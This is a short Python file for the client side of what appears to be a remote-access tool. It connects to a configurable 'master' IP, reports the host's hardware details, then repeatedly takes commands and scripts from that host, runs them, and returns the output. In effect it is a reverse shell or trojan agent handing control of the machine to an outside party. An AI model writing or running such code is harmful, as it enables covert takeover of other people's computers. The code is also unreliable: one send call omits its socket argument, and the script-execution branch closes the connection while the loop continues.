import socket
import sc_api
import hardware_info

MASTER_IP = "" # Put the IP of your machine here
MASTER_PORT = 9736 # Use the same port as the one you defined in server.py

def send_data(client, data):
    bytedata = bytes(data, 'utf-8')
    client.send(bytedata)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((MASTER_IP, MASTER_PORT))
send_data(hardware_info.get_all_and_format())
while True:
    response = client.recv(10000)
    api_call = response.decode(encoding='utf-8')
    if api_call.startswith("execm"):
        shellcall = sc_api.run_command(api_call[5:])
        send_data(client, shellcall)
    if api_call.startswith("execs"):
        execall = sc_api.run_script(api_call[5:])
        send_data(client, execall)
        client.close()
    if api_call.startswith("exit"):
        client.close()
        exit()